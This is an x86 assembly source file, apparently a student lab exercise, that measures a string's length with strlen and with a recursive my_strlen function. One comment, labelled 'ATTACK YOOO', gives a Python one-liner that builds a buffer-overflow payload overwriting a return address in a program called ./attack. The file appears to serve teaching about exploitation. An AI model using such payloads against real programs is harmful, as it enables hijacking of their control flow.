extern strlen
extern printf


section .rodata
    test_str db "hell, it's about time", 0
    format db "length = %d", 10, 0

section .text
global main

;; ATTACK YOOO:

;; python -c 'print "A" * 89 + "\x89\x84\x04\x08" + 4 * "A" + "\x17\x00\x00\x00" + "\x17\x00\x00\x00"' | ./attack
main:
    push ebp
    mov ebp, esp



    push test_str
    call strlen
    add esp, 4


    push eax
    push format
    call printf
    add esp, 8

    jmp function_call


    ; TODO a: Implement strlen-like functionality using a RECURSIVE implementation.

; my_strlen(char *array)
my_strlen:
    enter 0, 0

    mov edx, dword[ebp + 8]
    cmp byte[edx], 0
    jz end_of_fct

    inc eax
    inc edx
    push edx
    call my_strlen
    add esp, 4

end_of_fct:
    leave
    ret

function_call:
    xor eax, eax
    push test_str
    call my_strlen
    add esp, 4

    push eax
    push format
    call printf
    add esp, 8


    ; Return 0.
    xor eax, eax
    leave
    ret
